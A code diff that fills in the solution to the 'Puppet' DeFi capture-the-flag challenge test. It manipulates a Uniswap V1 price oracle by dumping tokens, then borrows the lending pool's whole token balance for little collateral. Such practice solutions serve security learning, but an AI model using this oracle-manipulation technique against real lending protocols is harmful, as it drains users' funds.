@@ -11,7 +11,7 @@ function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReser
 }
 
 describe('[Challenge] Puppet', function () {
-    let deployer, player;
+    let deployer, player, playerHelper;
     let token, exchangeTemplate, uniswapFactory, uniswapExchange, lendingPool;
 
     const UNISWAP_INITIAL_TOKEN_RESERVE = 10n * 10n ** 18n;
@@ -24,12 +24,13 @@ describe('[Challenge] Puppet', function () {
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
-        [deployer, player] = await ethers.getSigners();
+        [deployer, player, playerHelper] = await ethers.getSigners();
 
         const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
         const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);
         
         setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
+        setBalance(playerHelper.address, PLAYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy token to be traded in Uniswap
@@ -93,8 +94,20 @@ describe('[Challenge] Puppet', function () {
         ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
     });
 
-    it('Execution', async function () {
+    it('Execution Puppet', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attackContract = await (await ethers.getContractFactory('AttackPuppet')).deploy(
+            lendingPool.address,
+            uniswapExchange.address,
+            token.address,
+            player.address,
+            {value: 20n * 10n ** 18n}
+        );
+
+        await token.connect(player).transfer(playerHelper.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await token.connect(playerHelper).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await uniswapExchange.connect(playerHelper).tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1n, 10n ** 18n);
+        await lendingPool.connect(playerHelper).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {value: 20n * 10n ** 18n});
     });
 
     after(async function () {
